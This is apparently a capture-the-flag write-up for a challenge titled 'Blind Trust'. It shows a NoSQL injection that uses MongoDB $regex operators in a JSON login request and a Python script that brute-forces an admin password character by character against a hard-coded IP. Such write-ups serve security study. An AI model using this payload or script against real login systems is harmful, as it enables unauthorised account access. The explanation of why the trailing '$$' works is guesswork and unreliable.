---
description: NOSQLi
---

# Blind Trust

{% code title="description.txt" overflow="wrap" %}
```
The database remembers everything... but whispers only to those who ask properly.
```
{% endcode %}

### Homepage

<figure><img src="../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

### NoSQLi

I tried with SQLi payloads which ofc resulted me failure,\
upon trying for nosql, it gave me _half_ success.

<figure><img src="../../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

So we need to bruteforce admin password? \
&#xNAN;_&#x53;hort answer: yes!_

This python script does our work:

{% code title="bruteforce.py" %}
```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://15.207.248.78:50020/api/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 200:
                print("Found one more char : %s" % (password+c))
                password += c
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

The extra `$$` works because your regex still matches the real password, likely `s3cr3tPass`.\
MongoDB's regex engine or backend may ignore or mishandle extra `$` symbols.

<figure><img src="../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_heapbytes' still pwning.
